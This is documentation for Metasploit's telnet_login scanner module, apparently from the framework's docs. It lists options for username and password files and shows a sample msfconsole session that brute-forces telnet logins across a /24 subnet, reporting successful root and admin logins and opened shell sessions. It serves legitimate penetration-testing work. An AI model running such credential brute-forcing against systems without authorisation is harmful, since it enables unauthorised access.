## Description
This module will test a telnet login with a list of provided credentials on a range of machines and report successful logins. It allows you to pass credentials in a number of ways. You can specifically set a username and password, you can pass a list of usernames and a list of passwords for it to iterate through, or you can provide a file that contains usernames and passwords separated by a space.

## Verification Steps

1. Do: ```use auxiliary/scanner/telnet/telnet_login```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set THREADS [NUMBER OF THREADS]```
4. Do: ```set USER_FILE [USERNAME FILE]```
5. Do: ```set PASS_FILE [PASSWORD FILE]```
6. Do: ```run```

## Options


### BLANK PASSWORD 

When set to `true`, it'll bruteforce with blank passwords for all users. Default value is `false`.

### USERNAME

Only one username to authenticate with.

### PASSWORD

Only one password to authenticate with. 

### USERPASS_FILE 

File containing username and passwords separated by space, one pair one line.

### USER_FILE

File containing usernames one per line.

### PASS_FILE

File containing passwords one per line.


## Scenarios 

In this scan we have provided list of username and passwords files separately. 

```
msf > use use auxiliary/scanner/telnet/telnet_login
msf auxiliary(scanner/telnet/telnet_login) > set RHOSTS 1.1.1.0/24
RHOSTS => 1.1.1.0/24
msf auxiliary(scanner/telnet/telnet_login) > set THREADS 254
THREADS => 254
msf auxiliary(scanner/telnet/telnet_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(scanner/telnet/telnet_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf auxiliary(scanner/telnet/telnet_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf auxiliary(scanner/telnet/telnet_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(scanner/telnet/telnet_login) > run

[+] 1.1.1.116 - SUCCESSFUL LOGIN root : s00p3rs3ckret
[*] Command shell session 1 opened (1.1.1.101:50017 -> 1.1.1.116:23) at 2010-10-08 06:48:27 -0600
[+] 1.1.1.116 - SUCCESSFUL LOGIN admin : s00p3rs3ckret
[*] Command shell session 2 opened (1.1.1.101:41828 -> 1.1.1.116:23) at 2010-10-08 06:48:28 -0600
[*] Scanned 243 of 256 hosts (094% complete)
[+] 1.1.1.56 - SUCCESSFUL LOGIN msfadmin : msfadmin
[*] Command shell session 3 opened (1.1.1.101:49210 -> 1.1.1.56:23) at 2010-10-08 06:49:07 -0600
[*] Scanned 248 of 256 hosts (096% complete)
[*] Scanned 250 of 256 hosts (097% complete)
[*] Scanned 255 of 256 hosts (099% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/telnet/telnet_login) >
```
